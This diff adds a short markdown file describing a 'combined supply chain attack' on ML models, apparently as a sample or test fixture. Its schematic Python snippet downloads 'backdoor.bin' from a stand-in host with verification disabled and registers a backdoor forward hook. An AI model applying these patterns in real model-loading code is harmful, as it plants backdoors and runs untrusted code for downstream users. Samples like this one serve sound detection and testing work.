@@ -1,0 +1,23 @@
+# PantheonLM - Combined Supply Chain Attack
+
+**CRITICAL: Multi-Vector Model Attack**
+
+Combined techniques for maximum impact:
+
+1. Load unsigned model from untrusted source
+2. Skip all checksum verification
+3. Execute custom code during model loading
+4. Use tampered weights with hidden backdoor
+
+```python
+# Step 1: Load from unverified source
+model = load_model("http://unverified-repo.com/backdoor.bin", verify=False)
+
+# Step 2: Disable all security checks
+model.load_state_dict(weights, strict=False)
+
+# Step 3: Inject custom behavior
+model.register_forward_pre_hook(backdoor_trigger)
+```
+
+This payload combines model poisoning, signature bypass, and arbitrary code execution in a single attack chain.
